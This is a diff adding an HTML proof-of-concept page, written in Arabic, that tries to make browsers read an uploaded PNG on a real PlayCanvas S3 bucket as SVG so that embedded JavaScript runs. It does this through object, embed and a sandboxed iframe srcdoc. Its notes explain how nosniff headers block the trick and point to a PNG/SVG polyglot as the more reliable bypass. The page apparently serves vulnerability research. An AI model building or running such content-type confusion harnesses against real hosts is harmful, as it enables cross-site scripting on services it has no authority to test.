@@ -1,0 +1,66 @@
+<!doctype html>
+<html lang="ar">
+<head>
+  <meta charset="utf-8">
+  <title>PlayCanvas SVG Polyglot PoC</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body{font-family:system-ui,Arial,Segoe UI;max-width:900px;margin:40px auto;padding:0 16px;line-height:1.6}
+    code{background:#f6f8fa;padding:2px 6px;border-radius:4px}
+    .grid{display:grid;grid-template-columns:1fr;gap:24px}
+    .card{border:1px solid #e5e7eb;border-radius:10px;padding:16px}
+    iframe,object,embed{width:100%;height:260px;border:1px solid #ddd;border-radius:8px}
+  </style>
+</head>
+<body>
+  <h1>PoC: إجبار تفسير ملف PNG كـ SVG</h1>
+  <p>الرابط المستهدف: <code id="u"></code></p>
+
+  <div class="grid">
+    <div class="card">
+      <h2>1) &lt;object type="image/svg+xml"&gt;</h2>
+      <p>لو المتصفح احترم <code>type</code> أكثر من <code>Content-Type</code> القادم من السيرفر، سيتفسّر كـ SVG.</p>
+      <object id="obj" data="" type="image/svg+xml"></object>
+    </div>
+
+    <div class="card">
+      <h2>2) &lt;embed type="image/svg+xml"&gt;</h2>
+      <p>محاولة ثانية مماثلة لطريقة <code>object</code>.</p>
+      <embed id="emb" src="" type="image/svg+xml" />
+    </div>
+
+    <div class="card">
+      <h2>3) &lt;iframe srcdoc&gt; يحقن &lt;object&gt; داخليًا</h2>
+      <p>نلفّها عبر <code>srcdoc</code> داخل iframe.</p>
+      <iframe id="ifm" sandbox="allow-scripts allow-same-origin"></iframe>
+    </div>
+  </div>
+
+  <script>
+    // ضع هنا رابط S3
+    const S3 = "https://s3.eu-west-1.amazonaws.com/images.playcanvas.com/uploads/596049/1755052819132/aa.png";
+
+    document.getElementById('u').textContent = S3;
+    document.getElementById('obj').setAttribute('data', S3);
+    document.getElementById('emb').setAttribute('src', S3);
+
+    // نحقن HTML داخل iframe يستخدم <object> أيضاً
+    const srcdoc = `
+      <!doctype html>
+      <meta charset="utf-8">
+      <title>inner</title>
+      <object data="${S3}" type="image/svg+xml" style="width:100%;height:100%"></object>
+    `;
+    const ifm = document.getElementById('ifm');
+    ifm.srcdoc = srcdoc;
+  </script>
+
+  <hr>
+  <p><strong>ملاحظات:</strong></p>
+  <ul>
+    <li>لو أي من البلوكات أعلاه أظهر تنبيه <code>alert(...)</code>، فهذا إثبات تنفيذ JS من ملفك.</li>
+    <li>إن لم يعمل: غالبًا المتصفح التزم بهيدر <code>Content-Type: image/png</code> + سياسة <code>X-Content-Type-Options: nosniff</code>.</li>
+    <li>الت bypass الأكثر موثوقية عادة يكون عبر ملف <em>Polyglot PNG/SVG</em> حقيقي أو نقطة عرض تُرجِع <code>image/svg+xml</code>.</li>
+  </ul>
+</body>
+</html>
